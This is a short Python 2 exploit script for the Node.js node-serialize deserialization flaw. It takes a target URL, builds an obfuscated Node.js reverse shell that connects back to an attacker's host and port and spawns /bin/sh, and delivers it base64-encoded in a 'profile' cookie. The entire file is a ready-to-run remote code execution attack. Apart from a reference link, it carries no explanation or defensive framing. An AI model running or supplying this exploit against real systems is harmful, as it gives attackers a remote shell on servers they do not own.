#!/usr/bin/env python2
"""
  node-deserialization exploit
  reference : https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
"""
__author__ = 'kall.micke@gmail.com'

import requests
import base64
import sys

def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]


def BuildNodeJsReverseShell():

    print "[+] LHOST = %s" % LHOST
    print "[+] LPORT = %s" % LPORT

    nodejs_rev_shell = '''                                                                                                                                                                                                      
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
   var client = new net.Socket();
   client.connect(PORT, HOST, function() {
      var sh = spawn('/bin/sh',[]);
      client.write("Connected!\\n");
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
      sh.on('exit',function(code,signal){
         client.end("Disconnected!\\n");
      });
   });
   client.on('error', function(e) {
       setTimeout(c(HOST,PORT), TIMEOUT);
   });
}
c(HOST,PORT);
''' % (LHOST, LPORT)

    print "[+] Encoding"
    PAYLOAD = charencode(nodejs_rev_shell)
    return base64.b64encode("%seval(String.fromCharCode(%s))%s" % ("""{"rce":"_$$ND_FUNC$$_function (){""", PAYLOAD, """}()"}"""))


def exploit():

    cookies = {'profile': BuildNodeJsReverseShell()}
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'}
    r = requests.get('%s' % URL, cookies=cookies, headers=headers)
    print r.text()


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print "Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0])
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    exploit()

